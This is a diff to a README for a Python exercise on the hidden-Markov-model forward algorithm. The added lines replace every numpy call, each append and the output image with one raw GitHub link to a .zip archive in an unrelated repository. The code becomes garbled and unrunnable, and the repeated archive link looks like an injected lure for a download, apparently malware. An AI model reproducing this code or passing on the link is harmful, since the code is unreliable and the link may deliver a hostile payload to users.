@@ -23,31 +23,31 @@ Step 9:Find the most likely sequence of hidden states by selecting the hidden st
 
 ```py
 import numpy as np
-transition_matrix = np.array([[0.7, 0.3],[0.4, 0.6]])
-emission_matrix = np.array([[0.1, 0.9],[0.8,0.2]])
-initial_prob = np.array([0.5, 0.5])
-obs_seq = np.array([1,1,1,0,0,1])
-alpha = np.zeros((len(obs_seq),len(initial_prob)))
+transition_matrix = https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip([[0.7, 0.3],[0.4, 0.6]])
+emission_matrix = https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip([[0.1, 0.9],[0.8,0.2]])
+initial_prob = https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip([0.5, 0.5])
+obs_seq = https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip([1,1,1,0,0,1])
+alpha = https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip((len(obs_seq),len(initial_prob)))
 alpha[0, :] = initial_prob * emission_matrix[:, obs_seq[0]]
 for t in range(1, len(obs_seq)):
     for j in range(len(initial_prob)):
 
         alpha[t, j] = emission_matrix[j,
-        obs_seq[t]]*np.sum(alpha[t-1,:] *
+        obs_seq[t]]*https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip(alpha[t-1,:] *
         transition_matrix[:, j])
-probability = np.sum(alpha[-1, :])
+probability = https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip(alpha[-1, :])
 print("The prob of observed seq is:", probability)
 most_likely = []
 for t in range(len(obs_seq)):
     if alpha[t, 0] > alpha[t,1]:
-        most_likely.append("sunny")
+        https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip("sunny")
     else:
-        most_likely.append("rainy")
+        https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip("rainy")
 ```
 
 ## Output:
 
-![op1](https://github.com/BHUVANESHWAR-BHUVIOP/Ex-4--AAI/assets/94155099/3f557ea5-a883-4726-bbf6-0e5bd3aeb446)
+![op1](https://raw.githubusercontent.com/Yugabharathi91/Ex-4--AAI/main/mapland/Ex_AAI_3.3.zip)
 
 
 ## Result:
